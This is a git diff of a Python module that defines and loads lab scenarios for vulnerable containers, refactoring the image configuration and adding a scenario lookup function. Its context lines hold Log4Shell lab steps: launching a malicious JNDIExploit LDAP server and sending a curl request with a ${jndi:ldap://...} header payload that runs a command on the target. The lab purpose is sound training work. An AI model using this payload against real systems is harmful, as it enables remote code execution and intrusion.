@@ -118,15 +118,6 @@ def CreateDefault():
                     '2. Launch a malicious LDAP server using the command \n"java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888\"\n'
                     "3. Trigger the exploit using the command: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'\n"
                     "4. Go to Containers, open the main container shell and check for the presence of the pwned file by doing ls /tmp")
-    '''
-    images = {}
-    images['main'] = {}
-    images['main']['name'] = base
-    images['main']['interaction'] = 'browser'
-    images['main']['ports'] = {"8080/tcp":8080} # Container port: Host port
-    images['main']['download_link'] = None
-    images['other'] = []
-    '''
     images = []
     main_image = {}
     main_image['name'] = base
@@ -163,12 +154,23 @@ def Parse(_json : dict) -> Scenario:
     scen = Scenario(name, desc, goal, inst, base, images, cve, type, sources)
     return scen
 
-def LoadScenario(name : str) -> Scenario:
+def LoadScenario(name : str, object=True) -> Scenario:
 
     scenarios = Load()
     index = scenarioIndex(scenarios['scenarios'], name)
     if index is not None:
-        return Parse(scenarios['scenarios'][index])
+        if object is True:
+            return Parse(scenarios['scenarios'][index])
+        else:
+            return scenarios['scenarios'][index]
+
+def Get(scenarios_db : dict, scenario_name, object=True) -> dict | None:
+    for scenario in scenarios_db['scenarios']:
+        if scenario_name in scenario['name']:
+            if object is True:
+                return Parse(scenario)
+            else:
+                return scenario
     
 # region =====Testing=====
 
